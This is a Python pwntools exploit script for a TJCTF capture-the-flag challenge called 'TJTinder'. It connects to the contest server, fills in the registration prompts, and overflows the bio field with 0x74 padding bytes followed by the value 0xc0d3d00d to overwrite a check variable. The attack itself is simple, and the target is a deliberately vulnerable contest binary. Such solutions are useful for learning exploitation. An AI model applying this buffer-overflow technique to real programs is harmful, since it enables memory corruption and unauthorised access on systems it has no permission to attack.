#!/usr/bin/env python3

from pwn import *


r = process('./6efe89a92ae7aaf9a68cffe5840f55103ca121be9b8953e6736cf71409a57910_match')
r = remote('p1.tjctf.org', 8002)

r.readuntil('Welcome to TJTinder, please register to start matching!\n')

r.readuntil('Name: ')
r.sendline('a')

r.readuntil('Username: ')
r.sendline('a')

r.readuntil('Password: ')
r.sendline('a')

r.readuntil('Tinder Bio: ')

payload = b'a'*0x74 + p32(0xc0d3d00d)
r.sendline(payload)

r.interactive()
